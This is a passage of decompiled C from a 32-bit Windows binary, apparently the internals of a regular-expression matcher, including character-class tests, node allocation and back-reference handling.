uint __thiscall FUN_0040c893(void *this,int param_1,int *param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  puVar2 = (undefined *)*param_2;
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414c52(*(void **)((int)this + 0xc),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



void __thiscall FUN_0040c8c3(void *this,undefined4 param_1,char **param_2)

{
  FUN_00414116(this,param_1,param_2);
  return;
}



uint __thiscall FUN_0040c8d8(void *this,int param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  puVar2 = *(undefined **)(param_1 + 8);
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414c52(*(void **)((int)this + 0xc),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



void __thiscall FUN_0040c90d(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414116(this,param_1,(char **)(param_1 + 8));
  return;
}



undefined4 * __thiscall
FUN_0040c92a(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418044;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418078;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 __thiscall FUN_0040c9bf(void *this,undefined4 param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_004140d5(param_1,param_2);
  if (((char)uVar2 == '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2 + 1), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



uint FUN_0040c9f7(int param_1,char **param_2)

{
  char *pcVar1;
  uint uVar2;
  
  pcVar1 = *param_2;
  if ((*(char **)(param_1 + 4) == pcVar1) || (*pcVar1 == '\n')) {
    uVar2 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    *param_2 = pcVar1 + 1;
    uVar2 = CONCAT31((int3)((uint)(pcVar1 + 1) >> 8),1);
  }
  return uVar2;
}



bool FUN_0040ca17(undefined4 param_1,char **param_2)

{
  undefined4 uVar1;
  bool bVar2;
  
  uVar1 = FUN_004140d5(param_1,*param_2);
  bVar2 = (char)uVar1 == '\0';
  if (bVar2) {
    *param_2 = *param_2 + 1;
  }
  return bVar2;
}



int __thiscall FUN_0040ca39(void *this,int param_1)

{
  char *pcVar1;
  uint3 uVar3;
  int iVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  pcVar1 = *(char **)(param_1 + 8);
  uVar3 = (uint3)((uint)param_1 >> 8);
  if ((*(char **)(param_1 + 4) == pcVar1) || (*pcVar1 == '\n')) {
    iVar2 = (uint)uVar3 << 8;
  }
  else {
    *(char **)(param_1 + 8) = pcVar1 + 1;
    iVar2 = CONCAT31(uVar3,1);
  }
  return iVar2;
}



bool __thiscall FUN_0040ca5d(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  uVar1 = FUN_004140d5(param_1,*(char **)(param_1 + 8));
  bVar2 = (char)uVar1 == '\0';
  if (bVar2) {
    *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
  }
  return bVar2;
}



undefined4 * __thiscall
FUN_0040ca95(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004180ac;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004180e0;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



bool __thiscall FUN_0040cb75(void *this,int param_1)

{
  int iVar1;
  bool bVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  iVar1 = *(int *)(param_1 + 8);
  bVar2 = *(int *)(param_1 + 4) != iVar1;
  if (bVar2) {
    *(int *)(param_1 + 8) = iVar1 + 1;
  }
  return bVar2;
}



bool __thiscall FUN_0040cb94(void *this,int param_1)

{
  bool bVar1;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  bVar1 = **(char **)(param_1 + 8) != '\0';
  if (bVar1) {
    *(char **)(param_1 + 8) = *(char **)(param_1 + 8) + 1;
  }
  return bVar1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __fastcall FUN_0040cbb3(undefined4 *param_1)

{
  undefined *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415fd4;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  param_1[1] = 0;
  *param_1 = &DAT_00418148;
  local_8 = 0;
  puVar1 = FUN_004080d8();
  param_1[2] = puVar1;
  *param_1 = &LAB_00418114;
  ExceptionList = local_10;
  return param_1;
}



undefined4 __thiscall FUN_0040cbef(void *this,int param_1,undefined *param_2)

{
  bool bVar1;
  char cVar2;
  
  bVar1 = FUN_00414142(this,param_1,param_2);
  if ((bVar1) &&
     (cVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar2 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040cc24(void *this,uint param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_004141aa(this,param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040cc5a(void *this,int param_1,undefined4 *param_2)

{
  FUN_00414142(this,param_1,(undefined *)*param_2);
  return;
}



void __thiscall FUN_0040cc71(void *this,uint param_1,char **param_2)

{
  FUN_004141aa(this,param_1,*param_2);
  return;
}



void __thiscall FUN_0040cc88(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414142(this,param_1,*(undefined **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040cca4(void *this,uint param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_004141aa(this,param_1,*(char **)(param_1 + 8));
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __fastcall FUN_0040ccc0(undefined4 *param_1)

{
  undefined *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415fe8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  param_1[1] = 0;
  *param_1 = &DAT_00418148;
  local_8 = 0;
  puVar1 = FUN_004080d8();
  param_1[2] = puVar1;
  *param_1 = &LAB_0041817c;
  ExceptionList = local_10;
  return param_1;
}



undefined4 __thiscall FUN_0040ccfc(void *this,int param_1,undefined *param_2)

{
  bool bVar1;
  char cVar2;
  
  bVar1 = FUN_0041420c(this,param_1,param_2);
  if ((bVar1) &&
     (cVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar2 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040cd31(void *this,uint param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_00414274(this,param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040cd67(void *this,int param_1,undefined4 *param_2)

{
  FUN_0041420c(this,param_1,(undefined *)*param_2);
  return;
}



void __thiscall FUN_0040cd7e(void *this,uint param_1,char **param_2)

{
  FUN_00414274(this,param_1,*param_2);
  return;
}



void __thiscall FUN_0040cd95(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_0041420c(this,param_1,*(undefined **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040cdb1(void *this,uint param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414274(this,param_1,*(char **)(param_1 + 8));
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __fastcall FUN_0040cdcd(undefined4 *param_1)

{
  undefined *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415ffc;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  param_1[1] = 0;
  *param_1 = &DAT_00418148;
  local_8 = 0;
  puVar1 = FUN_004080d8();
  param_1[2] = puVar1;
  *param_1 = &DAT_004181b0;
  ExceptionList = local_10;
  return param_1;
}



undefined4 __thiscall FUN_0040ce09(void *this,int param_1,undefined *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_004142d6(this,param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040ce3e(void *this,int param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_0041433b(this,param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040ce74(void *this,int param_1,undefined4 *param_2)

{
  FUN_004142d6(this,param_1,(undefined *)*param_2);
  return;
}



void __thiscall FUN_0040ce8b(void *this,int param_1,char **param_2)

{
  FUN_0041433b(this,param_1,*param_2);
  return;
}



void __thiscall FUN_0040cea2(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_004142d6(this,param_1,*(undefined **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040cebe(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_0041433b(this,param_1,*(char **)(param_1 + 8));
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __fastcall FUN_0040ceda(undefined4 *param_1)

{
  undefined *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00416010;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  param_1[1] = 0;
  *param_1 = &DAT_00418148;
  local_8 = 0;
  puVar1 = FUN_004080d8();
  param_1[2] = puVar1;
  *param_1 = &LAB_004181e4;
  ExceptionList = local_10;
  return param_1;
}



undefined4 __thiscall FUN_0040cf16(void *this,int param_1,undefined *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_00414399(this,param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040cf4b(void *this,int param_1,char *param_2)

{
  char cVar1;
  undefined4 uVar2;
  
  uVar2 = FUN_004143fe(this,param_1,param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040cf81(void *this,int param_1,undefined4 *param_2)

{
  FUN_00414399(this,param_1,(undefined *)*param_2);
  return;
}



void __thiscall FUN_0040cf98(void *this,int param_1,char **param_2)

{
  FUN_004143fe(this,param_1,*param_2);
  return;
}



void __thiscall FUN_0040cfaf(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414399(this,param_1,*(undefined **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040cfcb(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_004143fe(this,param_1,*(char **)(param_1 + 8));
  return;
}



undefined4 * __thiscall
FUN_0040cfe7(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418218;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_0041824c;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



uint __thiscall FUN_0040d0b0(void *this,int param_1,int *param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  puVar2 = (undefined *)*param_2;
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414ca0(*(void **)((int)this + 8),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



uint __thiscall FUN_0040d0e0(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  undefined3 extraout_var;
  
  cVar1 = **param_2;
  uVar3 = CONCAT31((int3)((uint)*param_2 >> 8),cVar1);
  if (cVar1 != '\0') {
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),uVar3);
    uVar3 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return uVar3 & 0xffffff00;
}



uint __thiscall FUN_0040d10c(void *this,int param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  puVar2 = *(undefined **)(param_1 + 8);
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414ca0(*(void **)((int)this + 8),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



uint __thiscall FUN_0040d141(void *this,int param_1)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  undefined3 extraout_var;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  cVar1 = **(char **)(param_1 + 8);
  uVar3 = CONCAT31((int3)((uint)*(char **)(param_1 + 8) >> 8),cVar1);
  if (cVar1 != '\0') {
    bVar2 = FUN_00414ca0(*(void **)((int)this + 8),uVar3);
    uVar3 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return uVar3 & 0xffffff00;
}



undefined4 * __thiscall
FUN_0040d175(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418280;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004182b4;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



uint __thiscall FUN_0040d23e(void *this,int param_1,int *param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  puVar2 = (undefined *)*param_2;
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414cee(*(void **)((int)this + 8),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



uint __thiscall FUN_0040d26e(void *this,undefined4 param_1,char **param_2)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  undefined3 extraout_var;
  
  cVar1 = **param_2;
  uVar3 = CONCAT31((int3)((uint)*param_2 >> 8),cVar1);
  if (cVar1 != '\0') {
    bVar2 = FUN_00414cee(*(void **)((int)this + 8),uVar3);
    uVar3 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      *param_2 = *param_2 + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return uVar3 & 0xffffff00;
}



uint __thiscall FUN_0040d29a(void *this,int param_1)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined *puVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  puVar2 = *(undefined **)(param_1 + 8);
  if (*(undefined **)(param_1 + 4) != puVar2) {
    bVar1 = FUN_00414cee(*(void **)((int)this + 8),CONCAT31((int3)((uint)puVar2 >> 8),*puVar2));
    puVar2 = (undefined *)CONCAT31(extraout_var,bVar1);
    if (bVar1) {
      *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return (uint)puVar2 & 0xffffff00;
}



uint __thiscall FUN_0040d2cf(void *this,int param_1)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  undefined3 extraout_var;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  cVar1 = **(char **)(param_1 + 8);
  uVar3 = CONCAT31((int3)((uint)*(char **)(param_1 + 8) >> 8),cVar1);
  if (cVar1 != '\0') {
    bVar2 = FUN_00414cee(*(void **)((int)this + 8),uVar3);
    uVar3 = CONCAT31(extraout_var,bVar2);
    if (bVar2) {
      *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      return CONCAT31(extraout_var,1);
    }
  }
  return uVar3 & 0xffffff00;
}



undefined4 * __thiscall
FUN_0040d3a5(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004182e8;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_0041831c;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



uint __thiscall FUN_0040d46e(void *this,int param_1,char **param_2)

{
  char *pcVar1;
  uint uVar2;
  
  pcVar1 = *param_2;
  if ((*(char **)(param_1 + 4) == pcVar1) || (*pcVar1 != *(char *)((int)this + 8))) {
    uVar2 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    *param_2 = pcVar1 + 1;
    uVar2 = CONCAT31((int3)((uint)(pcVar1 + 1) >> 8),1);
  }
  return uVar2;
}



uint __thiscall FUN_0040d494(void *this,undefined4 param_1,char **param_2)

{
  char *pcVar1;
  uint uVar2;
  
  pcVar1 = *param_2;
  if ((*pcVar1 == '\0') || (*pcVar1 != *(char *)((int)this + 8))) {
    uVar2 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    *param_2 = pcVar1 + 1;
    uVar2 = CONCAT31((int3)((uint)(pcVar1 + 1) >> 8),1);
  }
  return uVar2;
}



int __thiscall FUN_0040d4b3(void *this,int param_1)

{
  char *pcVar1;
  uint3 uVar3;
  int iVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  pcVar1 = *(char **)(param_1 + 8);
  uVar3 = (uint3)((uint)param_1 >> 8);
  if ((*(char **)(param_1 + 4) == pcVar1) || (*pcVar1 != *(char *)((int)this + 8))) {
    iVar2 = (uint)uVar3 << 8;
  }
  else {
    *(char **)(param_1 + 8) = pcVar1 + 1;
    iVar2 = CONCAT31(uVar3,1);
  }
  return iVar2;
}



int __thiscall FUN_0040d4dd(void *this,int param_1)

{
  char cVar1;
  uint3 uVar3;
  int iVar2;
  
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  cVar1 = **(char **)(param_1 + 8);
  uVar3 = (uint3)((uint)param_1 >> 8);
  if ((cVar1 == '\0') || (cVar1 != *(char *)((int)this + 8))) {
    iVar2 = (uint)uVar3 << 8;
  }
  else {
    *(char **)(param_1 + 8) = *(char **)(param_1 + 8) + 1;
    iVar2 = CONCAT31(uVar3,1);
  }
  return iVar2;
}



undefined4 * __thiscall
FUN_0040d51f(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418350;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_00418384;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 __thiscall FUN_0040d581(void *this,int param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  
  uVar2 = FUN_0041445c(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040d5b7(void *this,undefined4 param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  
  uVar2 = FUN_00414487(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040d5ee(void *this,int param_1,char **param_2)

{
  FUN_0041445c(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040d603(void *this,undefined4 param_1,char **param_2)

{
  FUN_00414487(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040d618(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_0041445c(this,param_1,(char **)(param_1 + 8));
  return;
}



void __thiscall FUN_0040d635(void *this,int param_1)

{
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this + 4);
  FUN_00414487(this,param_1,(char **)(param_1 + 8));
  return;
}



undefined4 * __thiscall
FUN_0040d66f(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004183b8;
      return puVar1;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
      puVar1[3] = param_1;
      puVar1[2] = this;
      puVar1[4] = param_2;
      *puVar1 = &DAT_004183ec;
      return puVar1;
    }
  }
  return (undefined4 *)0x0;
}



undefined4 __thiscall FUN_0040d6d1(void *this,int *param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  
  uVar2 = FUN_004144ad(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_0040d707(void *this,int *param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  
  uVar2 = FUN_004144f4(this,param_1,&param_2);
  if (((char)uVar2 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2), cVar1 != '\0')) {
    return 1;
  }
  return 0;
}



void __thiscall FUN_0040d73e(void *this,int *param_1,char **param_2)

{
  FUN_004144ad(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040d753(void *this,int *param_1,char **param_2)

{
  FUN_004144f4(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040d768(void *this,int *param_1)

{
  param_1[4] = *(int *)((int)this + 4);
  FUN_004144ad(this,param_1,(char **)(param_1 + 2));
  return;
}



void __thiscall FUN_0040d785(void *this,int *param_1)

{
  param_1[4] = *(int *)((int)this + 4);
  FUN_004144f4(this,param_1,(char **)(param_1 + 2));
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall FUN_0040d7a2(void *this,undefined4 *param_1,int *param_2)

{
  int iVar1;
  int *piVar2;
  void **ppvVar3;
  int *piVar4;
  size_t sVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 uVar8;
  uint uVar9;
  undefined *local_44 [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_28 [16];
  undefined local_18 [8];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00416025;
  local_10 = ExceptionList;
  iVar1 = param_2[1];
  piVar2 = *(int **)(iVar1 + 4);
  piVar4 = (int *)*piVar2;
  ExceptionList = &local_10;
  ppvVar3 = &local_10;
  if (piVar2 != piVar4) {
    do {
      ppvVar3 = (void **)ExceptionList;
      if (*(uint *)((int)this + 8) < (uint)piVar4[2]) break;
      *(uint *)((int)this + 8) = *(uint *)((int)this + 8) + 1;
      piVar4 = (int *)*piVar4;
      ppvVar3 = (void **)ExceptionList;
    } while ((int *)*(int *)(iVar1 + 4) != piVar4);
  }
  ExceptionList = ppvVar3;
  iVar1 = *param_2;
  if (*(int *)(iVar1 + 4) == 0) {
    uVar9 = 0;
  }
  else {
    uVar9 = *(int *)(iVar1 + 8) - *(int *)(iVar1 + 4) >> 2;
  }
  if (uVar9 <= *(uint *)((int)this + 8)) {
    local_28[0] = param_1._3_1_;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_28,false);
    sVar5 = strlen(s_reference_to_nonexistent_group_0041c500);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_28,s_reference_to_nonexistent_group_0041c500,sVar5);
    local_8 = 0;
    std::logic_error::logic_error((logic_error *)local_44,local_28);
    local_44[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_44,(ThrowInfo *)&DAT_004196f8);
  }
  iVar7 = *(uint *)((int)this + 8) * 4;
  if (*(int *)(iVar7 + *(int *)(iVar1 + 4)) == 0) {
    *param_1 = DAT_00417690;
    uVar8 = DAT_00417694;
  }
  else {
    puVar6 = (undefined4 *)
             (**(code **)(**(int **)(iVar7 + *(int *)(iVar1 + 4)) + 0x2c))(local_18,param_2);
    *param_1 = *puVar6;
    uVar8 = puVar6[1];
  }
  param_1[1] = uVar8;
  ExceptionList = local_10;
  return;
}



undefined4 * __thiscall
FUN_0040d897(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  undefined4 *puVar1;
  
  if (param_3 == '\0') {
    puVar1 = (undefined4 *)FUN_0040507f(*param_4,0x14);
    if (puVar1 != (undefined4 *)0x0) {
      puVar1[1] = 0;
